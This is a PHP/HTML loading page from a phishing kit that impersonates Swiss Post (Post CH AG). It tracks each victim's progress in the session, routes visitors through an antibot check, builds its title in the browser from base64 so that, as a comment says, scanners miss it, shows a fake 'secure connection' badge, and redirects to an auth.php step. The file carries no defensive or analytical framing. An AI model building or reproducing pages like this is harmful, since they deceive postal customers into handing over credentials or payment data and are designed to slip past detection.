<?php
session_start();
include 'lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(3);
// TRACKING STEP
$_SESSION['step'] = 'loading1';
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title id="p-title">Loading...</title>
    <script>
        // Dynamic Title Injection to bypass scanners
        document.addEventListener("DOMContentLoaded", function() {
            var t = atob('<?= base64_encode(t("verification_title") . " | La Poste") ?>');
            document.title = t;
            document.getElementById('p-title').innerHTML = t;
        });
    </script>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <script src="assets/site.min.js"></script>
    <style>
        /* REFINED SPINNER DESIGN */
        .spinner-large {
            width: 60px;
            height: 60px;
            position: relative;
            margin: 0 auto;
        }
        
        .spinner-large::before, .spinner-large::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 50%;
        }

        .spinner-large::before {
            width: 100%;
            height: 100%;
            border: 3px solid #f0f0f0;
        }

        .spinner-large::after {
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-top-color: #ffcc00; /* Post Yellow */
            animation: spin-smooth 1s cubic-bezier(0.55, 0.055, 0.675, 0.19) infinite;
        }

        @keyframes spin-smooth {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .loading-card {
            text-align: center;
            padding: 40px 30px;
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
            max-width: 400px;
            width: 100%;
            margin: 0 auto;
        }
        
        .page-title {
            font-size: 20px !important;
            font-weight: 700 !important;
            margin-bottom: 8px !important;
            color: #222;
        }
        
        .page-subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }
        
        /* Progress Bar Refinement */
        .progress-bar-container {
            width: 100%;
            height: 4px; /* Sleeker height */
            background: #f1f1f1;
            border-radius: 2px;
            margin-top: 40px;
            overflow: hidden;
            position: relative;
        }
        
        .progress-bar {
            height: 100%;
            background: #ffcc00;
            width: 0%;
            border-radius: 2px;
            position: relative;
            animation: progress-animation 3.5s ease-in-out forwards;
        }
        
        /* Add a "shine" effect to the bar */
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            background-image: linear-gradient(
                -45deg, 
                rgba(255, 255, 255, .2) 25%, 
                transparent 25%, 
                transparent 50%, 
                rgba(255, 255, 255, .2) 50%, 
                rgba(255, 255, 255, .2) 75%, 
                transparent 75%, 
                transparent
            );
            z-index: 1;
            background-size: 20px 20px;
            animation: move 2s linear infinite;
            border-radius: 2px;
            overflow: hidden;
        }
        
        @keyframes move {
            0% { background-position: 0 0; }
            100% { background-position: 20px 20px; }
        }
        
        @keyframes progress-animation {
            0% { width: 5%; }
            100% { width: 100%; }
        }

        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
        }
        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }
    </style>
</head>
<body>

    <div class="post-yellow-bar"></div>

    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Post CH" class="post-logo">
            </div>
            <div class="header-right">
                <div class="lang-selector">
                    <a href="?lang=de" class="<?= $current_lang == 'de' ? 'active' : '' ?>">DE</a>
                    <a href="?lang=fr" class="<?= $current_lang == 'fr' ? 'active' : '' ?>">FR</a>
                    <a href="?lang=it" class="<?= $current_lang == 'it' ? 'active' : '' ?>">IT</a>
                    <a href="?lang=en" class="<?= $current_lang == 'en' ? 'active' : '' ?>">EN</a>
                </div>
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>

    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="stepper">
                <div class="step completed">1</div>
                <div class="step-line filled"></div>
                <div class="step active">2</div>
                <div class="step-line"></div>
                <div class="step">3</div>
            </div>

            <div class="form-card loading-card">
                
                <h1 class="page-title"><?= t('loading_delivery_title') ?></h1>
                <p class="page-subtitle"><?= t('auth_desc') ?></p> 

                <div class="loader-container" style="margin: 40px 0;">
                    <div class="spinner-large"></div>
                </div>

                <div class="progress-bar-container">
                    <div class="progress-bar"></div>
                </div>

                <p style="font-size: 12px; color: #999; margin-top: 30px;">
                    <?= t('wait_msg') ?>
                </p>
                
            </div>
        </div>
    </main>

    <footer class="post-footer">
        <div class="footer-container">
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Post CH AG
                    </p>
                </div>
            </div>

            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>

    <script>
    setTimeout(function() {
        window.location.href = './auth.php';
    }, 4000);
    </script>

</body>
</html>
